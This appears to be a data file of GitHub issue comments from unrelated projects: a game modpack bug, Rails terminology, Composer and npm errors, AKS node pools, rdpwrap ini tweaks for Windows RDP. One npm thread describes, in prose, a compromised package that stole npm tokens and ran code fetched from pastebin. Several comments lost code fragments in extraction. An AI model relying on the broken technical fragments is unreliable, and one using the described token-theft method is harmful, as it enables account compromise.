SevTech-Ages/DarkPacks/2626/392262970,"It's bad game design to not cover these things when they occur, sure players can start all over and spend hours re-tracing all their progress and create duplicate redundancy, but honestly, people wont. I agree it is a rare thing to happen and as such can be ignored if it's a hassle to simply patch with a high tier item from within TF. Cheating in the item is the best way to solve it, and would probably be what anyone does. Ghasts cannot destroy obsidian and can also relight a nether portal with their fireballs, I don't see a parallel as most times a Nether death will result in an OW spawn, in this particular case you are stuck IN the TF dimension. As for the 'changing the feel of the pack', I think that is just a an invented soundbite to attempt to add some gravitas to your argument. The pack has evolved and changed constantly from it's inception to where it is now. The past few months and hard work the scripting team have put in some huge fixes and changes (props to you btw ) ) but each iteration of updates and bug fixes has changed things for the better. If you don't want to fix the issue, just close it. It's still a bug. ",False,True,False,SevTech-Ages/DarkPacks/2626
SevTech-Ages/DarkPacks/2626/392614903,"Based on this information, this is not an issue anymore. If you can obtain everything and get the item to go back, I don't see what the issue is. Be prepared and bring a second if you are that concerned. ",False,True,False,SevTech-Ages/DarkPacks/2626
SevTech-Ages/DarkPacks/2626/392871047,"Why would you need to take spare diamonds to the Twilight Forest? Diamonds generate there fine in it's 'vanilla state'. I have discussed this with Darkosto and we have asked the TF team if it's either already possible, or can be added, to add more than 1 item to the portal gen. Making a portal to the hunting dimension is actually the best solution to dimension hop as it is made from wood and easily obtained in TF. The issue IS NOT invalid and as such has been addressed now. ",False,True,False,SevTech-Ages/DarkPacks/2626
SevTech-Ages/DarkPacks/2626/392871828,"?  I asked. I spoke to darkosto and formed my response based on his reply. Further discussion brought the idea of supporting multiple items, and thus I reported the request on the issue tracker and will be added when they do add. ",False,True,False,SevTech-Ages/DarkPacks/2626
franz/meetfranz/574/288416133,      Expected Behavior    Current Behavior    Screenshots (if appropriate) Possible Solution    Steps to Reproduce (for bugs)   1. 2. 3. 4.  ### Context    Your Environment   Franz Version used Operating System and version  ,False,True,False,franz/meetfranz/574
franz/meetfranz/574/357527034,"closed for obscenity, please use constructive criticism ",False,True,False,franz/meetfranz/574
franz/meetfranz/574/357527456,will investigate and open another issue if found valid ,False,True,False,franz/meetfranz/574
rails/rails/33830/358379339,"So many slaves in rails code, I feel very uncomfortable while reading these code. Please read  development still has a lot of terminology with a racist or patriarchal background. Let's change that.  Blacklist ➡ Denylist Whitelist ➡ Allowlist Killer app ➡ Beloved app Master/slave ➡ primary/replica  Examples ",False,True,False,rails/rails/33830
rails/rails/33830/419717321,For 1 and 2 they’ve already been changed. For 3 there are no “killer app” references for 4 can you give me a PR? There are only 4 references and they’re all in test  this case m/s is bad terminology. I’m not actually sure what the second one does the docs say it’s a file but I can’t find any docs of that it’s actually used for. Can change to primary/replica and see if anyone has better ideas. ,False,True,False,rails/rails/33830
rails/rails/33830/419733537,I identify as a replicant. We find it offensive to use the word replica ,False,True,False,rails/rails/33830
rails/rails/33830/419756099,Beloved app reminds me  git blame ➡️ git thank  ,False,True,False,rails/rails/33830
rails/rails/33830/419777405,Thanks @friend! Please do open PRs with specific changes. ,False,True,False,rails/rails/33830
visualstudio-docs/MicrosoftDocs/1682/369268394,"If you don't have access to the code, Solution #1 and #2 is out. This is certainly a possibility if the code is in a .NET Framework assembly or a third-party assembly.  So in Solution #3, what if you already have Debugging Option ""Enable property evaluation.."" UNCHECKED already. Then what do you try.... At least you could mention this possibility .. somebody must know.  Document Details ⚠ Do not edit this section. It is required for docs.microsoft.com ➟ GitHub issue linking.  ID 3cfd7078-683e-9fd6-247b-e75d4ed16a32 Version Independent ID ae3300c4-55a8-59b6-846b-50c48c88dcfe Content Error Evaluating the function 'function' timed out and needed to be aborted in an unsafe way - Visual Studio Content Source docs/debugger/error-evaluating-the-function-function-timed-out-and-needed-to-be-aborted-in-an-unsafe-way.md Product visual-studio-dev15 GitHub Login @friend Microsoft Alias mikejo  ",False,True,False,visualstudio-docs/MicrosoftDocs/1682
visualstudio-docs/MicrosoftDocs/1682/442251531,"I cannot perform steps 1 and 2 because I'm using HttpContext.Request.Form.Get(""MyProperty"") it always times out even with  Disabling property evaluation and other implicit function calls Use Manage Compatibility Mode  ",False,True,False,visualstudio-docs/MicrosoftDocs/1682
visualstudio-docs/MicrosoftDocs/1682/442263975,See #831 Please use the Send Feedback link &gt; Report a Problem for this issue. Thx! ,False,True,False,visualstudio-docs/MicrosoftDocs/1682
composer/composer/7526/347951340,"I have read the previous stance on the idea of allowing composer to manage multiple versions of a given package. However, I would like to re-open the discussion as there are valid use cases for wanting multiple versions installed in parallel. I would counter that this is completely possible based on the following arguments  It's not composer's responsibility to ensure that a developer doesn't try to do something they aren't supposed to do; mind you, it would be fair of composer to issue a stern warning, but ultimately allow a developer to shoot themselves in the foot if that's what they so choose to do. PHP's namespace aliasing and/or composer's autoloader might be a way to work around loading two classes from different versions of a package -- in other words, manipulate the namespace in the autoloader so that if I install versions  and  of  (with a namespace of ) I could reference them in code as either Package\Xyz\3.0\MyClassramsey/jenkins-phpnikic/php-parser ^1.0phpstan/phpstan-symfonynikic/php-parser ^4.0`. Both are commands to be run from a shell, so there would be no actual conflict with each other. The only thing stopping them from both being installed side by side is that composer does not support multiple versions of the same library.  I understand that this is probably going to be a decisive feature request. I also understand I've probably not thought out every single possible hurdle to making this happen. But I feel like this is an important request to discuss with you and the composer community. Thank you! ",False,True,False,composer/composer/7526
composer/composer/7526/410733739,"For some of your use-cases there are already existing work-arounds. In other cases, we simply do not support it. This discussion will lead nowhere. ",False,True,False,composer/composer/7526
composer/composer/7764/376348803,"Yesterday composer install works fine. Without any changes to composer.json &amp; composer.lock today it fails with Roberts-iMaczagis robert$ php composer.phar install Loading composer repositories with package information Installing dependencies (including require-dev) from lock file Your requirements could not be resolved to an installable set of packages. Problem 1 - Conclusion remove symfony/symfony v2.8.45 - don't install symfony/symfony v2.8.45|remove symfony/var-dumper v3.4.15 - don't install symfony/var-dumper v3.4.15|don't install symfony/symfony v2.8.45 - Installation request for symfony/symfony v2.8.45 -&gt; satisfiable by symfony/symfony[v2.8.45]. - Installation request for symfony/var-dumper v3.4.15 -&gt; satisfiable by symfony/var-dumper[v3.4.15].  Rolling back to 1.7.2 allows installing the old .lock file, however our CI/CD pipeline uses the latest composer which fails. What changed? Why would you break working .lock files? ",False,True,False,composer/composer/7764
composer/composer/7764/435014053,Same with ,False,True,False,composer/composer/7764
composer/composer/7764/435025164,We also have the problem since this morning. Problem 1  - Installation request for symfony/asset v4.1.6 -&gt; satisfiable by symfony/asset[v4.1.6].  - don't install symfony/symfony v3.4.17|don't install symfony/asset v4.1.6  - Installation request for symfony/symfony v3.4.17 -&gt; satisfiable by symfony/symfony[v3.4.17].  ♠ ,False,True,False,composer/composer/7764
composer/composer/7764/435035188,"These are all due to  most likely.. Edge cases that should have broken before but were allowed accidentally. In most of these cases you have both symfony/symfony AND some of the individual components installed, in different versions. This doesn't make any sense and might end up with unexpected results as one or the other package gets autoloaded. To resolve this make sure you remove symfony/symfony or the other components depending on your app's requirements. ",False,True,False,composer/composer/7764
composer/composer/7764/435039748,I understand the reasoning to not allow these combinations anymore when you run composer update but this breaks existing .lock files. This breaks existing installations when updating a minor version increment of composer. ,False,True,False,composer/composer/7764
composer/composer/7764/435050705,"Yes that's unfortunate but it's not really something we can selectively fix as the solver is needed as well when running . And technically it was a bug, albeit you surely can argue there, but fixing it in 1.8.0 would also lead to the same problem, and maybe more people affected by then, so IMO the sooner the better. ",False,True,False,composer/composer/7764
composer/composer/7764/435050865,I am having the same issue also with 1.7.3 ,False,True,False,composer/composer/7764
composer/composer/7764/435059993,"@friend  A compatibility break between minor versions is ""better""? Surely you jest! ",False,True,False,composer/composer/7764
composer/composer/7764/435060118,"Please do not post ""me too"" comments if you aren't going to provide any additional information. It spams everyone ands makes it harder to find help in this thread. To resolve this make sure you remove symfony/symfony or the other symfony components depending on your app's requirements. e.g.  states that those two are incompatible, you have to find a way to remove either of them, which might involve upgrading/downgrading the other. ",False,True,False,composer/composer/7764
composer/composer/7764/435071200,"I ran into this issue with the following command This appears to be because the  requires , and  library requires a FORK of that library (). Both http-hmac-php libraries use different namespaces, so I'm not sure why I can't have both present in my project. My standing guess is that both libraries indicate they are , and that is the source of the problem? But I am not requesting that library at all, so that doesn't completely make sense either... I'm not sure I understand what is causing this issue...? Just to piggyback on some of the comments above, this does seem like a poor choice of a change to include in a patch release. It's clear this is affecting a lot of people based on the activity here 6 hours after the release. I think some kind of composer hints that this will break in the future minor release would have been a better DX, and give users time to update their libraries before it fubars people's builds. ",False,True,False,composer/composer/7764
npm/npm/20791/327130542,"I'm opening this issue because  [ ] npm is crashing. [ ] npm is producing an incorrect install. [x ] npm is doing something I don't understand. [ ] npm is producing incorrect or undesirable behavior. [ ] Other (see below for feature requests)  What's going wrong? This afternoon all servers in our AWS EU-Frankfurt environment started throwing the error regardless of what package we are trying to install It then locks up and does not exit the process. How can the CLI team reproduce the problem? ♠npm installnpm -vnode -vnpm config get registry` prints  OS X/macOS, or Linux? Amazon Linux AMI release 2017.09  Network issues  Geographic location where npm was run AWS - EU [x ] I use a proxy to connect to the npm registry. [x ] I use a proxy to connect to the web. [x ] I use a proxy when downloading Git repos. [ ] I access the npm registry via a VPN [ ] I don't use a proxy, but have limited or unreliable internet access.   Container [ ] I develop using Vagrant on Windows. [ ] I develop using Vagrant on OS X or Linux. [ ] I develop / deploy using Docker. [ ] I deploy to a PaaS (Triton, Heroku).    ",False,True,False,npm/npm/20791
npm/npm/20791/392619452,"I'm getting the same error, started today. Using Azure 2018-05-28T235424.4436370Z npm ERR! code E418 2018-05-28T235424.4481896Z npm ERR! 418 I'm a teapot @friend/cli@^1.6.5 ",False,True,False,npm/npm/20791
npm/npm/20791/392619580,I'm having the same issue. The server is running in Japan and behind proxy to connetct to the npm registry and the web. ,False,True,False,npm/npm/20791
npm/npm/20791/392620073,"Same here, started today.  Error on my local machine (windows) and a VM (linux). ",False,True,False,npm/npm/20791
npm/npm/20791/392620086,I'm having same issue. ,False,True,False,npm/npm/20791
npm/npm/20791/392620192,Having the same issue on our build server ,False,True,False,npm/npm/20791
npm/npm/20791/392620327,"Running into the same issue here, running into problems on both local and build server npm ERR! 418 I'm a teapot express@^4.15.3 ",False,True,False,npm/npm/20791
npm/npm/20791/392620832,Same here. ,False,True,False,npm/npm/20791
npm/npm/20791/392620909,This is going to sound terrible but I'm SOOO HAPPY that you guys are having the same problem. ,False,True,False,npm/npm/20791
npm/npm/20791/392621681,"Yep, same problem here.  returns 418 I'm a Teapot, and install stalls. ",False,True,False,npm/npm/20791
npm/npm/20791/392621819,"I know the Internet loves being cute, but this error is unhelpful. ",False,True,False,npm/npm/20791
npm/npm/20791/392623317,"We're having this issue on AWS, behind a corporate proxy. Unfortunately we don't have the chance to go around this proxy. ",False,True,False,npm/npm/20791
npm/npm/20791/392623389,Corporate proxy - no option to bypass $ npm - v 5.6.0 $node -v v9.6.1 ,False,True,False,npm/npm/20791
npm/npm/20791/392623446,My colleague tried to run  and he was succeeded.  His environment log I also tried that in an older version of npm and node. Does NOT the issue reproduce in older versions of npm? ,False,True,False,npm/npm/20791
npm/npm/20791/392624104,"Yeah, rolling back to Node 4.26 works. 8 still doesn't. This is dumb. ",False,True,False,npm/npm/20791
npm/npm/20791/392624281,"👍  Me too. For those looking for a workaround, yarn still seems to be healthy. ",False,True,False,npm/npm/20791
npm/npm/20791/392624326,I totally didn't even think about Yarn. Jeez. ,False,True,False,npm/npm/20791
npm/npm/20791/392626994,I have started experiencing this issue from just today. I am behind an organisational firewall. $ npm install npm ERR! code E418 npm ERR! 418 I'm a teapot @friend/core@friend Other people in my team have no issues running the same npm code from their workstation. Only me is having the problem. ,False,True,False,npm/npm/20791
npm/npm/20791/392627314,"The body of the 418 is . Looks like some npm clients are erroneously appending the port to the Host header, but only when going through a proxy, and that's confusing the registry ",False,True,False,npm/npm/20791
npm/npm/20791/392627936,"yes, we are meeting the same issue now. ",False,True,False,npm/npm/20791
npm/npm/20791/392628425,Same issue here. We have a successful install without a proxy and the teapot error when installing from inside a container hooked up to the proxy. ,False,True,False,npm/npm/20791
npm/npm/20791/392628846,"I'm gonna lock this for now, because I'm sure it's gonna get plenty of traffic. You really don't need to respond to repeat what every other poster is saying. The registry team has been informed. ",False,True,False,npm/npm/20791
npm/npm/20791/392648459,"We've fixed this -- we now accept the port appended to the host. @friend's comment was most helpful, thank you! ",False,True,False,npm/npm/20791
npm/npm/21202/340599374,"Please see the following issue  3.7.2 has been published an hour ago which is a hacked version that steals the NPM accounts or something. Please pull the version 3.7.2 from the npm and freeze the account so this does not get propagated. As a matter of fact, there is no release tag for 3.7.2 on Github, so I think it would be great to consider double checking with Github repository before publishing. This would at least limit the possibility of uploading the viruses to NPM without having Github credentials to tag the version. ",False,True,False,npm/npm/21202
npm/npm/21202/404502145,3.7.2 seems to have been unpublished now. Would love to hear what actually happened. ,False,True,False,npm/npm/21202
npm/npm/21202/404507723,"@friend shortly, the npm credentials have been stolen and malicious release has been made directly to npm (not GitHub). The malicious code ran upon  and attempted to transfer the npm authentication token from  to remote server. Surprisingly the tampered code only contained a bootstrap script that downloaded and executed the script (with ) from pastebin. Curious thing, all tampered files had the modification date set to Oct 26, 1985. So I guess now we know the birthday of whoever who did this. 😆 All of what happened is something to think about, why didn't npm spot the calls to  and reject the update. I know many packers use  as well but come on, it's not 1999 again. ",False,True,False,npm/npm/21202
npm/npm/21202/404519128,"The first question that came to mind after seeing this issue is why is there a difference between the published code on npm, and the code on github? I know why, because when you run , you publish from a local directory. I think npm can increase security by not letting people publish code from their local directories but only download code from a public repo like github’s (ala server-to-server). It would of course only be possible for public modules/repositories. That way all published code always has a history. It increases security because to publish malicious code you need to  steal both npm credentials and github credentials commit and push malicious code to github pass security a project's build pipeline (and possible security scans)   I'm probably not the first with this idea, but has it been considered by the npm team yet? I can also imagine that the world would be a safer place if  would require an npm account with 2FA enabled. ",False,True,False,npm/npm/21202
npm/npm/21202/404520017,"@friend that's true, but some code is transpiled upon release so this has an impact of forcing developers to store all their stuff in git or put the strain on npm servers to pull the code and run all build procedures before publishing. ",False,True,False,npm/npm/21202
npm/npm/21202/404520251,"fyi @friend all files showing Oct 26, 1985 (a Back to the Future reference joke) is actually intented behavior for NPM (see  and not related to this hack. ",False,True,False,npm/npm/21202
npm/npm/21202/404520512,The actual solution would be  on one build environment is not a good idea in the grand scheme of things. ,False,True,False,npm/npm/21202
npm/npm/21202/404523546,"@friend Thanks, I didn't know this. I mostly use , so 1985 came as a surprise.  👍 ",False,True,False,npm/npm/21202
npm/npm/21202/404525239,"Has already the attacker got tokens by this attack? If so, will other packages be hacked again? Do you have a plan to revoke all npm users' token or to stop publishing any packages? ",False,True,False,npm/npm/21202
npm/npm/21202/404526848,It seems like the reasonable thing to do would be  Temporarily halt all package publications Search the entire registry for references to this virus and unpublish any infected packages Globally revoke all authentication tokens  Re-enable package publications  ,False,True,False,npm/npm/21202
npm/npm/21202/404530671,"The key is revoking all npmrc tokens globally before the attacker takes action. If this isn't done soon enough, the only way to completely prevent the damage is the manual audit of the entire npm registry, and that is borderline impossible. (so i'm really hoping npm revokes everything soon enough, otherwise I'll just have to stop using it) ",False,True,False,npm/npm/21202
npm/npm/21202/404550816,"@friend Agree with all of your points, but I'd go a step further with number 2 in addition to searching the registry, unpublish all packages published since the affected version was published (and even then, it's not clear yet if the eslint-scope infection was a result of a further upstream infection). The virus could have modified itself (or have been manually modified, or use a different version entirely) so as to be unrecognizable from the original. There's nothing to say that the pastebin code from this incident is the same as what would be infected in other packages of authors with their credentials compromised. The credentials are being logged to web counters, which to use the credentials they would have to be monitored from an outside source, so there's nothing stopping that outside source from publishing a different script entirely. ",False,True,False,npm/npm/21202
npm/npm/21202/404556093,"Everyone, I am not sure where else to put this and the eslint-scope issue has been locked, but is there anyway to search the npm cache to make sure this version is not cached? I am on windows if it helps or doesn't. ",False,True,False,npm/npm/21202
npm/npm/21202/404556294,"The script seems to have run successfully on one user's Windows system. The ""problem"" in the script seems to have been that it would only run correctly if the full source code was fetched in the first chunk - the malware author forgot to ensure all chunks had been fetched. I gleaned this from the original eslint-scope issue. So it is reasonable to expect many users' auth tokens to have been stolen. ",False,True,False,npm/npm/21202
npm/npm/21202/404560361,I plus one the global unpublishing of all packages and revoking all tokens until this is resolved. This does NOT look good. ,False,True,False,npm/npm/21202
npm/npm/21202/404562285,"@friend and others suggesting npm integration into git. Not every npm package uses git, and certainly not everyone uses github. Marrying the two concepts doesn't make sense to me. I think the best solution is faster communication and awareness of exploited packages. Some brainstorming ideas  Maybe integrate the npm ecosystem into something like node security project. Warnings should be shown inside of NPM cli when a vulnerable package is found in the dep tree. Easy flagging of infected code to notify maintainers. Have stricter publish regimens for foundational (heavily depended on) dependencies. Maybe enforce manual audits with two factor authentication. Realistically dependencies that have thousands and thousands of dependents should not be modified so frequently, or they must go through a manual audit step.  Perhaps have a badge awarded to releases that have been manually audited and approved with a 2 factor verification. ... I could go on  ",False,True,False,npm/npm/21202
npm/npm/21202/404562886,"Just forbid all packages containing a string ""eval"", or make them require manual reviewal. But my advise would be just ban them for good ",False,True,False,npm/npm/21202
npm/npm/21202/404563286,"@friend how would that help? then they write the code to a file, and  it.. or download a compiled binary instead of using JS for their malware. btw, why do you have two accounts? @friend / @friend - AFAIK the GitHub ToS only allow one account per human ",False,True,False,npm/npm/21202
npm/npm/21202/404563405,@friend yea but what about using Function constructor syntax I feel like we are addressing the symptom by banning eval not the root problem. ,False,True,False,npm/npm/21202
npm/npm/21202/404563902,"@friend That won't work. Eval is needed for a lot of things, and banning it won't do. We need package signing - which NPM actively rejected, but I feel like this has a use right now judging from the current events right now ",False,True,False,npm/npm/21202
npm/npm/21202/404564500,@friend This does not work well with some JS perf optimization patterns. See the monomorphization that improved webpack's speed by ~80% between version 3 and 4. ,False,True,False,npm/npm/21202
npm/npm/21202/404565133,"Probably the only acceptable long-term solution is to allow and encourage package signing, with the ability to use a second factor (such as a hardware key) for the signing. It will take a long time for the majority of package maintainers to reach this level of security awareness, but it's a project that must be started. ",False,True,False,npm/npm/21202
npm/npm/21202/404565813,@friend plus one on that but I don't know why NPM rejected this - it was a majorly a good security practice ,False,True,False,npm/npm/21202
npm/npm/21202/404568390,"We've updated our status page about this incident. I'm going to lock this thread because it's likely to draw a lot of traffic and I think actual information will be buried. Please keep an eye on the status page, our social media, npm.comminuty announcements, or this thread for any particularly big things. ",False,True,False,npm/npm/21202
npm/npm/21202/404569202,"(update apologies, my original post included a link to this issue instead of the actual status page. The link has been updated) ",False,True,False,npm/npm/21202
rdpwrap/stascorp/613/391046635,"Please add support for update KB4471332 windows 10 ver 10.0.1763.168 is not supported after windows update, please fix it. ",False,True,False,rdpwrap/stascorp/613
rdpwrap/stascorp/613/447281992,"@friend  have look #611  (hajubu 18-12-13 -reply with attachments )  hint Data areas for Win10 1809-17763.194 ( with CU KB447132) does not change the termsrv.dll The CU  keeps the ""termsrv.dll"" file version 10.0.17763.168  You may follow the steps explained, which are relevant for ""adding"" Data sections [10.0.17763.168] and [10.0.17763.168-SLInit].  You may use the 17763-templates.zip and net-stop-and-start_termsrv.zip of the post .Good Luck  ",False,True,False,rdpwrap/stascorp/613
rdpwrap/stascorp/613/447291787,I changed ini file in C\Program Files\RDP Wrapper to this  and then restart terminal services net stop termserv and then start it ,False,True,False,rdpwrap/stascorp/613
rdpwrap/stascorp/613/447292308,Thank for support ,False,True,False,rdpwrap/stascorp/613
rdpwrap/stascorp/613/447298045,"@friend  !High-Five! Just a short note   You fixed  the section [10.0.17763.165]  only with the x64-data. If you like to have a look to my findings as mentioned above you may supply the missing data. i.e.  for (.165, .167, .168 ) we can use the same data-values for the offsets with separate headers. I do also believe that the sections 17763.1 and .168 are sufficient as .165 and .167 had been give as .cab file version (fast upd and ...) ;  the last .168 and .194 are given in 2x CU-KB Updates as .msu file in the $MS upd.catalogue to ease the task [17763-templates611.zip] (",False,True,False,rdpwrap/stascorp/613
rdpwrap/stascorp/613/447648531,Duplicate of #606. ,False,True,False,rdpwrap/stascorp/613
rdpwrap/stascorp/613/450315470,"Hi Everyone, I have tried with this .ini file and it worked for me, it's for 10.0.17763.167 version x64 rdpwrap.zip  ",False,True,False,rdpwrap/stascorp/613
react-native-camera/react-native-community/1897/376680978,"Related Modules RNCamera Platforms Android Versions android react-native-camera ^1.3.1 react-native 0.57.4 react 16.6.0-alpha.8af6728 when i press record button i got this  Possible Unhandled Promise Rejection (id 0) Error setAudioSource failed. Error setAudioSource failed. I have added all the necessary permissions。   &lt;uses-permission androidname=""android.permission.CAMERA"" /&gt;     &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt;     &lt;uses-permission androidname=""android.permission.RECORD_VIDEO""/&gt;     &lt;uses-permission androidname=""android.permission.READ_EXTERNAL_STORAGE"" /&gt;     &lt;uses-permission androidname=""android.permission.WRITE_EXTERNAL_STORAGE"" /&gt; my code  import React, { Component } from 'react'; import { StyleSheet, Text, TouchableOpacity, View } from 'react-native'; import { RNCamera } from 'react-native-camera'; class CameraRecordScreen extends Component {     constructor(props){         super(props);         this.state={             isFlashOnfalse,             isRecordingfalse,         } }  componentDidMount() { };  render() {     return (         &lt;View style={styles.container}&gt;             &lt;RNCamera                 ref={ref =&gt; {                     this.camera = ref;                 }}                 style={styles.preview}                 type={RNCamera.Constants.Type.back}                 flashMode={RNCamera.Constants.FlashMode.off}                 permissionDialogTitle={'Permission to use camera'}                 permissionDialogMessage={'We need your permission to use your camera phone'}             &gt;                 &lt;View style={{ flex 0, flexDirection 'row', justifyContent 'center' }}&gt;                     &lt;View style={{position'absolute',top30,left-40}} /&gt;                     {this.state.isRecording ?                         &lt;TouchableOpacity                             onPress={this.stopRecord.bind(this)}                             style={styles.capture}&gt;                             &lt;Text style={{ fontSize 14 }}&gt; Stop &lt;/Text&gt;                         &lt;/TouchableOpacity&gt;                          &lt;TouchableOpacity                             onPress={this.takeRecord.bind(this)}                             style={styles.capture}&gt;                             &lt;Text style={{ fontSize 14 }}&gt; Record &lt;/Text&gt;                         &lt;/TouchableOpacity&gt;                     }                 &lt;/View&gt;             &lt;/RNCamera&gt;         &lt;/View&gt;     ); }  takeRecord= async function(){     if (this.camera) {         this.setState({isRecordingtrue});         const options = { qualityRNCamera.Constants.VideoQuality[""480p""],maxFileSize(100*1024*1024), maxDuration 60 };         const data = await this.camera.recordAsync(options);         console.log('takeRecord data', data);     } };  stopRecord = () =&gt; {     if (this.camera) {         this.setState({isRecordingfalse});         this.camera.stopRecording()     } }  } const styles = StyleSheet.create({     container {         flex 1,         flexDirection 'column',         backgroundColor 'black',     },     preview {         flex 1,         justifyContent 'flex-end',         alignItems 'center',     },     capture {         flex 0,         backgroundColor '#fff',         borderRadius 5,         padding 15,         paddingHorizontal 20,         alignSelf 'center',         margin 20,     }, }); export default CameraRecordScreen ",False,True,False,react-native-camera/react-native-community/1897
react-native-camera/react-native-community/1897/439862638,@friend Can you tell me how did you solve this problem.. I got the url from this and I saved using cameraroll component to gallery and that also returned a url but teh video is not playing in android? In iOS the video is not appearing in gallery ,False,True,False,react-native-camera/react-native-community/1897
react-native-camera/react-native-community/1897/440945085,"I have the same problem; ""react-native-camera"" ""1.4.3"",  &lt;uses-permission androidname=""android.permission.CAMERA""/&gt; &lt;uses-permission androidname=""android.permission.RECORD_AUDIO""/&gt;     &lt;uses-permission androidname=""android.permission.RECORD_VIDEO""/&gt;     &lt;uses-permission androidname=""android.permission.READ_EXTERNAL_STORAGE"" /&gt;     &lt;uses-permission androidname=""android.permission.WRITE_EXTERNAL_STORAGE"" /&gt; ext {     buildToolsVersion = ""26.0.3""     minSdkVersion = 16     compileSdkVersion = 26     targetSdkVersion = 26     googlePlayServicesVersion = ""12.0.1""     supportLibVersion = ""27.1.0"" } Error setAudioSource failed. when I click recordAsync, simulator crash;  😫😫😫 ",False,True,False,react-native-camera/react-native-community/1897
react-native-camera/react-native-community/1897/441569467,@friend Does it also crash on a real device? ,False,True,False,react-native-camera/react-native-community/1897
react-native-camera/react-native-community/1897/450031170,Please write english to help everyone. I am going to lock conversation. Recording does only work on real devices.. ,False,True,False,react-native-camera/react-native-community/1897
npm/npm/21206/340715954,"What's the feature? IMO  should only install exact packages unless explicitly told not to via a flag e.g. . What problem is the feature intended to solve?  Would make CI builds repeatable by default Would make it impossible to accidentally, silently upgrade to a compromised package e.g. #21202   ",False,True,False,npm/npm/21206
npm/npm/21206/404576380,Please open this at ,False,True,False,npm/npm/21206
npm/npm/21206/404577187,"Thanks, @friend. I'm also going to lock this since it's likely to draw attention from #21202. As a note this feature request is covered by  as of . Please upgrade to the latest npm. The feature, as described, would also not make CI builds repeatable by default, since that would involve all transitive dependencies having been published with this default, and that would likely take an immense amount of time and never be quite done, considering the scale of the registry, so I don't consider it a very good solution. There are other things in the work to address issues with unintended dependency updates, but now's not the time to talk about them. Have a good one! ",False,True,False,npm/npm/21206
AKS/Azure/287/311034047,"This is a tracking issue for node pool support as mentioned by @friend in  Node pools are shown in the UI, but without a way to add new ones. I'm wanting to add some L series nodes to my cluster to run a database, but keep using D series machines for the bulk of my workers. When are multiple node pools expected to be supported?  ",False,True,False,AKS/Azure/287
AKS/Azure/287/378799959,"In the roadmap, about 6 months ",False,True,False,AKS/Azure/287
AKS/Azure/287/379062348,Thanks for the heads up. ,False,True,False,AKS/Azure/287
AKS/Azure/287/379530617,"We are planning to move our cloudservices to a container environment. I was very impressed with the ease of use of AKS while testing it. However, the impossibility to scale the size of the VMs is a blocker at the moment (#79). Do I understand it correctly that with the future possibility of adding different nodepools it would be possible to add a new nodepool and then delete the old one without service interruption? ",False,True,False,AKS/Azure/287
AKS/Azure/287/389145228,@friend Could you tell us if it will be possible to remove Nodepools? thank you! ,False,True,False,AKS/Azure/287
AKS/Azure/287/389155392,"There is only one node pool support today . You cannot delete that node pool. You will need to delete the cluster itself. When we have support for multiple node pools , you will be able to delete a node pool when you have more than one node pool. Thanks Saurya  From lawgorht notifications@friend.com Sent Tuesday, May 15, 2018 51542 AM To Azure/AKS Cc Saurya Das; Mention Subject Re [Azure/AKS] Add Node Pool Support (#287) @friend Could you tell us if it will be possible to remove Nodepools? thank you! — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread",False,True,False,AKS/Azure/287
AKS/Azure/287/397724405,"plus one for this. I'm also interested in using different node pools for security reasons, like single tenancy for Vault. ",False,True,False,AKS/Azure/287
AKS/Azure/287/409787201,Cross reference ,False,True,False,AKS/Azure/287
AKS/Azure/287/411319859,"Hi all, any update on this ? Based on this thread we are 2 months away from node pool support ? ",False,True,False,AKS/Azure/287
AKS/Azure/287/412077965,"This is a deal breaker for us as we require running most workloads on standard VMs while CPU intensive workloads require special CPU hardware like the F series VMs.  It's also critical for migrating to VMs with larger OS disks. Otherwise, when disks are too small, the kubelet starts evicting pods due to the  signal. ",False,True,False,AKS/Azure/287
AKS/Azure/287/412078807,Can we at least open up preview versions? 😭 ,False,True,False,AKS/Azure/287
AKS/Azure/287/412556859,I made a manual temporary hack) Just change single node size manually to increase RAM (need more for one pod). Looks like it works normally. But I don't know what to expect after next time horizontal scaling. ,False,True,False,AKS/Azure/287
AKS/Azure/287/412596955,@friend that doesn't work with horizontal scaling unfortunately. I tried asking Azure support for help but they said we have to wait for node pool support for this to work ,False,True,False,AKS/Azure/287
AKS/Azure/287/412662949,"It also doesn't work for a mixing node types (eg, one node pool has GPUs). ",False,True,False,AKS/Azure/287
AKS/Azure/287/416944403,Any new on this issue? Is there a beta version already? Still planned to october? ,False,True,False,AKS/Azure/287
AKS/Azure/287/417853930,Any update on this? I really need it for production. ,False,True,False,AKS/Azure/287
AKS/Azure/287/417875160,End of Oct is still the ETA .. Thanks for your patience. ,False,True,False,AKS/Azure/287
AKS/Azure/287/424422402,T - 36 days and counting ,False,True,False,AKS/Azure/287
AKS/Azure/287/425925220,cool. k8 v1.12 released with Azure Scale Set support. must be getting close. ,False,True,False,AKS/Azure/287
AKS/Azure/287/427407568,"Will support for multiple node pools also include the ability to have one pool of Linux nodes and another pool of Windows nodes. Currently the only option for windows containers on AKS is through virtual-kubelets, which uses ACI. There are too many limitations in using ACI and windows containers. These restrictions shouldn't be necessary if you can setup a pool of windows nodes. ",False,True,False,AKS/Azure/287
AKS/Azure/287/427436278,the eventual goal is to support hybrid clusters but there is no ETA yet for windows support in AKS. Sorry. ,False,True,False,AKS/Azure/287
AKS/Azure/287/431764063,There is a problem with iteration over pools in all templates used to generate ARM templates. See  AKS uses ACS-Engine under hood. ,False,True,False,AKS/Azure/287
AKS/Azure/287/433692516,Hi @friend ! Can you please give us current status of the ETA of node pools ?  Would REALLY appriciate planning according to ETA on my end as its an urgent update for production env. Thanks a lot ! ,False,True,False,AKS/Azure/287
AKS/Azure/287/433974590,node pools has been delayed by a quarter and will now come in the 1st quarter of 2019. Apologies for the delay. I will keep you posted if we get it in earlier. ,False,True,False,AKS/Azure/287
AKS/Azure/287/434428402,@friend can you please tell us what is the reason to delay it ? ,False,True,False,AKS/Azure/287
AKS/Azure/287/434866830,@friend Currently we are focused on fixing any existing issues and keep the QoS high before we roll out new features ... ,False,True,False,AKS/Azure/287
AKS/Azure/287/434867582,@friend hire more people ;-) ,False,True,False,AKS/Azure/287
AKS/Azure/287/436731556,@friend  AKS team... I appreciate your decision to delay to maintain quality. Thank you. ,False,True,False,AKS/Azure/287
AKS/Azure/287/436748076,That presumes that the existing offering is actually GA quality. ,False,True,False,AKS/Azure/287
AKS/Azure/287/436870765,"I am really disappointed. Your competitors GKE, EKS and even IBM have already supported node pool for a long time, among the most popular Kubernetes service providers, Azure also offers the least features. My company has used Azure for all projects, we need the node pool for production, and this feature has been delayed for a long time. We may change to use EKS. ",False,True,False,AKS/Azure/287
